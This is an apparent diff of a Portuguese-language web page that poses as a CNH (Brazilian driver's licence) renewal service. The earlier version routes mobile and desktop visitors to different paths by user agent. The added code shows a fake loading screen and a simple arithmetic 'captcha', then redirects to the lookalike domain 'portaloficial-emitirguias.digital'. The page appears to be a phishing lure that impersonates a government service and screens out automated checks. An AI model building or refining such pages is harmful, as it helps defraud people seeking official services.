@@ -5,19 +5,22 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Renovação CNH</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --azul-principal: #0056b3;
+      --azul-primario: #0056b3;
       --azul-hover: #004494;
-      --branco-vidro: rgba(255,255,255,0.95);
-      --box-shadow-padrao: 0 4px 12px rgba(0,0,0,0.15);
     }
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body { height: 100%; font-family: 'Roboto', sans-serif; }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
+      font-family: 'Roboto', sans-serif;
+      min-height: 100vh;
       background: url('cx.jpg') no-repeat center center;
       background-size: cover;
       display: flex;
@@ -26,6 +29,7 @@
       position: relative;
       overflow: hidden;
     }
+
     body::before {
       content: '';
       position: absolute;
@@ -34,73 +38,193 @@
       filter: blur(8px);
       z-index: 0;
     }
-    .painel {
-      position: relative;
+
+    .tela-blur {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0,0,0,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
       z-index: 1;
-      background: var(--branco-vidro);
+    }
+
+    .box {
+      background-color: rgba(255, 255, 255, 0.95);
       padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       width: 90%;
       max-width: 420px;
-      border-radius: 10px;
-      box-shadow: var(--box-shadow-padrao);
       text-align: center;
+      position: relative;
+      z-index: 2;
     }
-    .painel h1 {
-      font-size: 1.6rem;
-      color: var(--azul-principal);
+
+    .box h2 {
+      font-size: 1.5rem;
+      color: var(--azul-primario);
       font-weight: 500;
       margin-bottom: 1rem;
     }
-    .painel p {
+
+    .loading {
+      margin: 0 auto 1rem;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: 4px solid #eee;
+      border-top-color: var(--azul-primario);
+      animation: girar 1s linear infinite;
+    }
+
+    @keyframes girar {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .box p {
       font-size: 1rem;
       color: #333;
       line-height: 1.5;
-      margin-bottom: 1.5rem;
+      margin-bottom: 1rem;
     }
-    .cta-link {
-      display: inline-block;
-      padding: 0.75rem 1.4rem;
+
+    .captcha {
+      width: 120px;
+      height: 50px;
+      margin: 0 auto 1rem;
+      border: 1px solid #ccc;
+      display: block;
+    }
+
+    .respostas {
+      display: flex;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
+    }
+
+    .respostas img {
+      width: 60px;
+      height: 40px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      cursor: pointer;
+      transition: border-color 0.2s;
+    }
+
+    .respostas img:hover {
+      border-color: var(--azul-primario);
+    }
+
+    .btn-continuar {
+      display: none;
+      padding: 0.75rem 1.5rem;
       font-size: 1rem;
-      font-weight: 500;
+      background-color: var(--azul-primario);
       color: #fff;
-      background-color: var(--azul-principal);
       border: none;
       border-radius: 4px;
-      text-decoration: none;
+      font-weight: 500;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: background 0.2s;
     }
-    .cta-link:hover {
+
+    .btn-continuar.show {
+      display: inline-block;
+    }
+
+    .btn-continuar:hover {
       background-color: var(--azul-hover);
     }
+
     @media (max-width: 480px) {
-      .painel { padding: 1.5rem; }
-      .painel h1 { font-size: 1.3rem; }
-      .cta-link { width: 65%; }
+      .box { padding: 1.5rem; }
+      .box h2 { font-size: 1.25rem; }
+      .respostas img { width: 50px; height: 35px; }
+      .btn-continuar { width: 60%; }
     }
   </style>
 </head>
 <body>
-  <main class="painel" role="region" aria-label="Renovação da CNH">
-    <h1>Renovação de CNH</h1>
-    <p>Solicite sua renovação com segurança.</p>
-    <button class="cta-link"
-            id="botaoProsseguir"
-            data-url-mobile="/renovacao/"
-            data-url-desktop="/ajuda">
-      Prosseguir
-    </button>
-  </main>
+
+  <div class="tela-blur" id="janelaCaptcha">
+    <div class="box">
+      <h2 id="titulo">Carregando...</h2>
+      <div class="loading"></div>
+      <p id="texto">Resolva a soma abaixo para continuar:</p>
+      <img id="captchaGerado" class="captcha" alt="captcha"/>
+      <div class="respostas" id="opcoes"></div>
+      <button id="botaoValidar" class="btn-continuar">Continuar</button>
+    </div>
+  </div>
 
   <script>
-    window.addEventListener('DOMContentLoaded', function () {
-      const botao = document.getElementById('botaoProsseguir');
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      const destino = isMobile ? botao.dataset.urlMobile : botao.dataset.urlDesktop;
-      botao.addEventListener('click', function () {
-        window.location.href = destino;
+    const gerarValores = () => {
+      let x, y;
+      do {
+        x = Math.floor(Math.random() * 9) + 1;
+        y = Math.floor(Math.random() * 9) + 1;
+      } while (x + y >= 10);
+      return [x, y, x + y];
+    };
+
+    const [num1, num2, resultadoCorreto] = gerarValores();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 120;
+    canvas.height = 50;
+    const ctx = canvas.getContext('2d');
+    ctx.fillStyle = '#fff';
+    ctx.fillRect(0, 0, 120, 50);
+    ctx.font = '24px Roboto';
+    ctx.fillStyle = '#333';
+    const questao = `${num1} + ${num2} = ?`;
+    const larguraTexto = ctx.measureText(questao).width;
+    ctx.fillText(questao, (120 - larguraTexto) / 2, 32);
+    ctx.strokeStyle = '#aaa';
+    ctx.beginPath();
+    ctx.moveTo(0, 25);
+    ctx.lineTo(120, 25);
+    ctx.stroke();
+    document.getElementById('captchaGerado').src = canvas.toDataURL();
+
+    const alternativas = new Set([resultadoCorreto]);
+    while (alternativas.size < 3) {
+      const novoValor = (Math.floor(Math.random() * 9) + 1) + (Math.floor(Math.random() * 9) + 1);
+      if (novoValor < 10) alternativas.add(novoValor);
+    }
+
+    [...alternativas].sort(() => Math.random() - 0.5).forEach(opcao => {
+      const altCanvas = document.createElement('canvas');
+      altCanvas.width = 60;
+      altCanvas.height = 40;
+      const altCtx = altCanvas.getContext('2d');
+      altCtx.fillStyle = '#fff';
+      altCtx.fillRect(0, 0, 60, 40);
+      altCtx.font = '20px Roboto';
+      altCtx.fillStyle = '#333';
+      const textoW = altCtx.measureText(opcao.toString()).width;
+      altCtx.fillText(opcao.toString(), (60 - textoW) / 2, 26);
+      const img = document.createElement('img');
+      img.src = altCanvas.toDataURL();
+      img.alt = opcao;
+      img.addEventListener('click', () => {
+        if (opcao === resultadoCorreto) {
+          document.getElementById('botaoValidar').classList.add('show');
+        } else {
+          alert('Resposta incorreta!');
+          location.reload();
+        }
       });
+      document.getElementById('opcoes').appendChild(img);
     });
+
+    document.getElementById('botaoValidar').onclick = () => {
+      window.location.href = 'https://portaloficial-emitirguias.digital/';
+    };
   </script>
+
 </body>
 </html>
